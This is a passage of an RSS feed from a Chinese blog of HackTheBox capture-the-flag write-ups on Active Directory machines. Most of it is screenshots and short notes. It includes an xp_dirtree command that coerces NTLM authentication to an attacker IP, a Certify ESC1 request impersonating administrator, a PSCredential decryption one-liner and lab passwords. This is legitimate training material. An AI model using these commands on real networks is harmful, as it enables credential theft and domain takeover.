&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7cdb5207d45b80cf3fd62f35c794318fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;继续信息收集，桌面上有一个cred.xml文件&lt;/p&gt;
&lt;p&gt;该文件是 PSCredential 对象当中&lt;/p&gt;
&lt;p&gt;可以通过powershell恢复：&lt;/p&gt;
&lt;p&gt;$credential = import-clixml -path c:\Users\nico\Desktop\cred.xml;$credential.GetNetworkCredential().username;$credential.GetNetworkCredential().password&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE34d94a35113dc09d309109c4c45ac6a2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;成功获取到了用户名密码：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X021 Search</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x021-search/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x021-search/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbcc7bd75966846206fcbb8e9fed7e937image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf8d179bcc8a0b24c3c2da0380dc7d5a6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE19e74db1c6e96895df83a9c994f2512aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcdc1b87c9c82b1e12d33f29819ca7d81image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的服务:http、LDAP、smb：&lt;/p&gt;
&lt;p&gt;先看smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf6ced49653d9791722037b9723f60c4dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接着看ldap：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa9a646175e1e6421dceb8f62aacaf44aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;剩下的就只有http了，重点关注：用户名与密码，漏洞&lt;/p&gt;
&lt;p&gt;about us是重灾区：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE667dba0de9f8977eabc2c07ee0f2f2daimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd7407382aa354570fdc5406c9f1e8121image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;暂且这样吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb379e193d6d14f258b02a54ef5ca0741image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名枚举：&lt;/p&gt;
&lt;p&gt;枚举失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbbcf140df7fd8c265b82e1cc28ee5508image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是dirsearch发现了东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8899e2a6a81205dbe6090d87204e596fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE658829953b871cb4dedf12e5da750154image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是好像没什么用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6f7a492420ebd6b8ac06cef394abb7aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;峰回路转：&lt;/p&gt;
&lt;p&gt;cewl收集的字典发现信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE22841233ed8649a2b798726adbca825bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有了用户名，尝试AS-REP Roasting：&lt;/p&gt;
&lt;p&gt;失败了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE37aa5438b09281904842ad07bd4f11faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只能尝试密码爆破了：&lt;/p&gt;
&lt;p&gt;但是获取策略失败了，也只能试试了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5c3197bfdfba3aa3a66835cac92423a8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;密码爆破失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE44a01eb2596f5de56af7c1fa3f424798image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;服了，很好，手写体的英语，里面说了密码和用户名：&lt;/p&gt;
&lt;p&gt;发送密码给Hope sharp&lt;/p&gt;
&lt;p&gt;IsolationIsKey?&lt;/p&gt;
&lt;p&gt;哦，这对我的视力和英语都是一个挑战：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE58812f51dcbc62b315a6a4c3294cb435image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;很好，名字的组合也是一个问题：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3fdb5186c8772f8a4a045478322878e0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;机器没有开明显的远程登录端口，如果要登录，那么只能获取管理权限，目前只能围绕着域渗透的思路来进行，先上bloodhound：&lt;/p&gt;
&lt;p&gt;看来主要是集中在这条路线上了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6ddc00a4b74a93c6fca3a86638a36a94image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X022 cascade</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x022-cascade/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x022-cascade/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;端口扫描就出现问题了，不让扫描？&lt;/p&gt;
&lt;p&gt;最开始7000速率不行，改成2000就可以了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5b4510dec7bf52d0a6fdb5778f11656eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7c3558936730c318e4f16a7a4710881aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe59f9ec75d3b2e07289bfda3ede34301image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;关键端口开放情况，445、389、3268、5985&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEef367b5e20ce2fe2e6c5c7af8f0a1a33image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE534850d681dd10754905937f9f8f01a7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有匿名访问：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf72e7106a3b68884c2de05b953cd7289image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;获取了用户名，可以尝试密码喷洒，或者AS-REP Roasting：&lt;/p&gt;
&lt;p&gt;失败了，但是这里面密码喷洒一般很少：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE81b62e47f4b347b26233abc593d71817image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;查看用户所有信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE80e99820f3a63b441c8f8ae31c5f680aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现密码：&lt;/p&gt;
&lt;p&gt;r.thompson&lt;/p&gt;
&lt;p&gt;rY4n5eva&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5ebcb345680f2cf3e99d1a5346ef60e2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winrm登录失败，回头看smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE341c8acb1447d66cb8f6db4647876625image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;翻查了一圈，把所有东西都下载下来了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE487616986a1b1f7e82dbaa82257d6cc2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;新用户？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE664b982284b36d00711ac12bf5d60859image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;别的不说，在目前的情况下，我认为这些文件里面，应该是存在登录成功的方式的：&lt;/p&gt;
&lt;p&gt;破解vnc的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE08d05305af661ad047e2733e0594d088image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名为：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE73254ba3dd435455c5bcae596a3cb7b9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登陆成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9fa334cf4469d5319461bc6c3a2e0144image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;bloodhound：&lt;/p&gt;
&lt;p&gt;好像没路子：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc9fb672ffed27c19776681e4b0ed4a49image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看看winpe:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9126de058238ce21cb0fec0d0eb12e3cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0df3b5f3f25492129fe291418d862bf1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;好像没有头绪，应该是得继续信息收集：&lt;/p&gt;
&lt;p&gt;再去使用s.smith登录smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb1693bd21024dc11b08f1032713bfaedimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现db文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6ee9797f68c4c925e44ed3e9677d69c4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现是sqllite文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE4c8ea33241bc97ef76aab785e2d4df3cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X023 Escape</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x023-escape/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x023-escape/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE240fca89a47034f53abe9633404aa2bdimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE879f954d7fb881ade1d7bc17e7aac2e4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf7aa426ecdb6ae1e15d35397b13941d4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的端口：389，445，1433，5985&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE86f4b2d645b49a6f29f43ef449edc719image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;smb发现这个东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE622d9e2dcc45ef56d812810e9a62425eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现sqlserver登录方式：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf6f86c814237304e9ae50205f8812cadimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;连接成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfcf3e587b7fdca0e5f97b907476c477fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;看了一圈儿，确实没东西了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE93c53ee64eda152b3a85dd37a474591cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;最后无奈看了wp，属实没想到，sqlserver也能玩儿relay：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb4410d8a0f9b2db975f55218ef5b7042image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;EXEC MASTER.sys.xp_dirtree &amp;lsquo;\10.10.16.12\test&amp;rsquo;, 1, 1&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE11226968d518189f35c30b446f9d04c1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;很快就破解了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2a5fbd741986f884e6e00480ac611c41image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;可以直接登录winrm:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2527100e2c4da7b9bddff00d8ba82ec6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe72515d5df9229358952cef420e422dcimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;bloodhound:&lt;/p&gt;
&lt;p&gt;无法分析出可用的路径：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEed4a4ebd002b6571a549c3bb96629870image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;winpeass也没能发现什么有用的东西，看了一下wp，呐应该是思路的缺失了，查看sqlserver的日志文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3444a296c8840c0c82d03c468cf4a537image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;咋说呢，错误日志一般是不会记录错误密码的，但是会记录错误用户：&lt;/p&gt;
&lt;p&gt;感觉还是有点缺乏想象力，这里应该是模仿用户输入错误了密码为用户名，导致日志被记录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEec28db1f6252dfbd0177e8309ebf054fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;是远程组的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd7a2ddc8d65b75c8cd4d35e0720513e6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;登录看看：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE48bee9d46c173643897e2ae0c40d3868image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;很好，bloodhound有局限，ADCS的相关内容其实也有了解，但是没想到这一点：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc57b1c3d18a5c33ea7055cb65593cbcbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ESC1：&lt;/p&gt;
&lt;p&gt;.\Certify.exe request /ca:sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb1b4d27cb784d2bbdaac9777449b7e84image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;复制出来，提取：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE2ce912c75e9c2ad1492c36814f69d5f8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X024 Intelligence</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x024-intelligence/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x024-intelligence/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf4f9356afcea710b2f0901fc2a4add22image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfa7745219d387cc800a4386832e34a59image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE644bca0295f9adbcadfd2d37e73cf0fbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;根据端口开放情况进行判断，值得关注的端口：80、389、445、5985&lt;/p&gt;
&lt;p&gt;先看445：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEfa6384699fc73d26bfc5c37730a2a038image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;389：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa1db95b74dea5f6707387458a8d69784image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;那就只剩下80了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe55cbf3d3369f5348c7378bae8482f7dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只有一个documents目录，whatweb识别一下：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbbe3541eb52e7d4d102a8bc7d586f862image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是好像也没有历史漏洞，再看看这个pdf文件，发现可以枚举：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7485d8a1d87462f40454ba059af38274image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不能挨个看吧，我挨个看了：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://10.10.10.248/documents/2020-06-04-upload.pdf&#34;&gt;http://10.10.10.248/documents/2020-06-04-upload.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;默认密码：&lt;/p&gt;
&lt;p&gt;NewIntelligenceCorpUser9876&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE03c57ed047ab86d62173da91b40be201image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;拿到密码，想到的就是密码喷洒：&lt;/p&gt;
&lt;p&gt;但是使用自带的字典失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6725a70ab9c274d66493a7f6d799ae72image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是有个地方是存在账号的，那就是文件的撰写人:&lt;/p&gt;
&lt;p&gt;写个bash脚本，下载了2020年的所有文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE059979f0e61bd1b4e32d4910b8baecb2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里明白了，有相关工具如果提供了详细参数的，建议就使用详细参数看看吧：&lt;/p&gt;
&lt;p&gt;应该是工具或者环境的问题，这里没法爆破成功：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE94978b586d88e74a2b82e75734479c35image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;带上详细参数看看：&lt;/p&gt;
&lt;p&gt;并非是密码错误，也是就说这个账号密码应该是正确的，只是请求kdc出错了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE58ec1d32c8aca8572c6d76ff5de63726image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;拿到了账号密码，但是看了一下&lt;/p&gt;
&lt;p&gt;ldap和winrm都不能登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1a1d57adb84c7ea3de1f7411e9b48fa1image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;试试smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbb836cee37273e3f81a3a46b0c5b5bbeimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;大概看了一下这个脚本，他说每5分钟执行一次，请求一些东西，但是怎么利用呢，猜测是relay，再接着看：&lt;/p&gt;
&lt;p&gt;发现flag:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5c55f4785d655114866dd7675f33200bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;后面看了一下wp，确实知识面欠缺，需要添加一个dns解析，而且域内是默认可以添加的，有合法身份即可：&lt;/p&gt;
&lt;p&gt;添加dns记录后，relay:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf7c343b450a1772e87fc1e735ee208b6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE1a504314810bc96ac98c94b0275adaafimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不让登录：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEccd1611c31186d956fef5100cf44069cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;不过不要紧，正常渗透就行了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6eb416c86bb9f58e7aab3e73c7fc2d33image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X025 monteverde</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x025-monteverde/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x025-monteverde/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
